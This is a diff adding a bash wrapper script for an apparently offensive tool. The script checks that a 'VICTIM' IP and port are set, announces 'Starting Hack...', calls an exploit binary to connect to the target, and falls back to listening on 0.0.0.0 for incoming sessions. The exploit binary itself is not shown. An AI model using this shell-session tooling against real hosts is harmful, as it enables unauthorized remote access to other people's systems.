@@ -1,0 +1,38 @@
+source $PODGL/lib/fsh.cfg.sh
+source $PODGL/lib/colors
+dexit(){
+ stty -raw echo
+ exit
+}
+trap dexit SIGINT
+if   [ "$VICTIM" == '0.0.0.0' ] || [ "$VICTIM" == '' ];then
+  cerr Error Target IP is not Defined, Execute info victim
+  exit 1
+elif [ "$PORT" == '' ];then
+  cerr Error Target Port is not Defined, Execute info victim
+  exit 1
+fi
+cout Starting Hack...
+sleep 0.5
+cout Automating Binaries....
+sleep 0.3
+printf "${green}☢ Trying$white to ${red}connect${white} With ${red}$VICTIM ${white}Port$red $PORT \n"
+
+$PODGL/bin/exploit connect $VICTIM $PORT
+if [ "$?" == 2 ];then
+
+  sleep 0.4
+  cerr Connection Request Rejected..!
+  sleep 0.4
+  printf "${green}☢ ${cyan}Listening on port $red$PORT$cyan For Incoming Sessions.... $purple(Press CTRL+C To Stop)\n"
+  
+  $PODGL/bin/exploit listen 0.0.0.0 $PORT
+  if [ "$?" == 4 ];then
+     sleep 0.3
+     cerr An Error Was Occured, Maybe Another Proccess is Using This Address
+  fi
+  
+fi
+
+
+stty -raw echo
